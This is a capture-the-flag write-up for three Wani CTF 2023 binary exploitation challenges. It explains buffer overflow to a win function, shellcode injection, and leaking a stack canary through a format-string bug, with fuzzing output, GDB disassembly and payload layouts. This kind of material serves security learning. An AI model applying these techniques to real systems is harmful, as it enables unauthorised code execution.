# Wani CTF 2023

## ret2win

This is a simple buffer overflow, the aim of this challenge is to jump to the win function.
The payload will be structured as follows:
> Payload = PADDING + win_address()

## shell-basic
Simple shellcode injection

```bash
[*] '/home/feedz/Desktop/waniCTF/waniCTF_2023/pwn-shell-basic/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments

```

we can see that NX is disabled and that means we can go with shellcode injection.


## Canaleak

the aim of this challenge is to leak the stack canary through format string vulnerability and then jump to the win function.

```C
while (strcmp(nope, "YES")) {
    printf("You can't overwrite return address if canary is enabled.\nDo you "
           "agree with me? : ");
    scanf("%s", nope);
    printf(nope);
  }
```

the focus is to leak stuff from the stack through printf, as I said first this will help us to leak the stack canary.
we can try to fuzz the stack and try to identify the stack canary.
the stack canary end in 00.

```
0: Do you agree with me? : %0$p
1: Do you agree with me? : 0xa
2: Do you agree with me? : (nil)
3: Do you agree with me? : 0x7f32a9619aa0
4: Do you agree with me? : (nil)
5: Do you agree with me? : 0x7fc3bb378040
6: Do you agree with me? : 0x70243625
7: Do you agree with me? : (nil)
8: Do you agree with me? : (nil)
9: Do you agree with me? : 0xef1553a888ae3b00
10: Do you agree with me? : 0x1
11: Do you agree with me? : 0x7fe97bc29d90
12: Do you agree with me? : (nil)
13: Do you agree with me? : 0x401254
14: Do you agree with me? : 0x100000000
```

we can see that in the first 15 occurrences only 1 ends with 00.
Number 9 is our candidate

Now let's check better with GDB.
```gdb
You can't overwrite return address if canary is enabled.
Do you agree with me? : %9$p
0xb2431c61d958e500

gef➤  canary
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L4935 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
[+] The canary of process 16904 is at 0x7fffffffe2b9, value is 0xb2431c61d958e500
```
yes, %9$p will be our stack canary.
let's craft our payload:
> Payload = buffer_padding + canary + padding_rbp + win_address

Note that win fuction starts at 0x40123d but this function will push rbp on the stack, and this will dis-align the stack.
So we can pass 0x401245 directly, which is the syscall to /bin/sh.

```gdb
gef➤  disas win
Dump of assembler code for function win:
   0x000000000040123d <+0>:	endbr64 
   0x0000000000401241 <+4>:	push   rbp
   0x0000000000401242 <+5>:	mov    rbp,rsp
   0x0000000000401245 <+8>:	lea    rdi,[rip+0xdbc]        # 0x402008
   0x000000000040124c <+15>:	call   0x4010d0 <system@plt> 
   0x0000000000401251 <+20>:	nop
   0x0000000000401252 <+21>:	pop    rbp
   0x0000000000401253 <+22>:	ret    
End of assembler dump.
```

the stack alignment will look something like this:
```gdb
0x007ffc9282ce08│+0x0008: "AAAAAAAAAAAAAAAA"
0x007ffc9282ce10│+0x0010: "AAAAAAAA"
0x007ffc9282ce18│+0x0018: 0x338641c2c0127900
0x007ffc9282ce20│+0x0020: 0x4242424242424242	 ← $rbp
0x007ffc9282ce28│+0x0028: 0x00000000401245  →  <win+8> lea rdi, [rip+0xdbc]        # 0x402008
```
just run the exploit and get the flag!








